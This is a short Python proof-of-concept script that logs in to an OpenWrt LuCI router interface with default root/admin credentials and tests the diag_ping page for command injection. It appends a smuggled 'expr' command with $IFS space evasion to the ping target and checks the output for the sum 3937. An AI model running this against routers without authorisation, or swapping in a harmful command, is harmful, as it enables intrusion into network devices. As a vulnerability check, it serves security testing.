#!/usr/bin/python
import sys, requests

def check_args():
        
        if len(sys.argv) != 2:
            print(sys.argv[0]+" <ip-address>")
            exit(2)
        else:
            global ip
            ip = sys.argv[1]

def auth_get(page):

    URL = 'http://'+ip+'/cgi-bin/luci/'
    payload = {
        'luci_username': 'root',
        'luci_password': 'admin',
        }
    session = requests.session()
    r = session.post(URL+page, data=payload)
    return r.text

def main():

    check_args()

    mystr = auth_get("/admin/network/diag_ping/openwrt.org;expr$IFS'1337'$IFS+$IFS'2600'")
    if mystr == '':
        print("Command Injection not found.")
    else:
        num = int(mystr)
        if num == 3937:
            print("Command injection found.")
main()
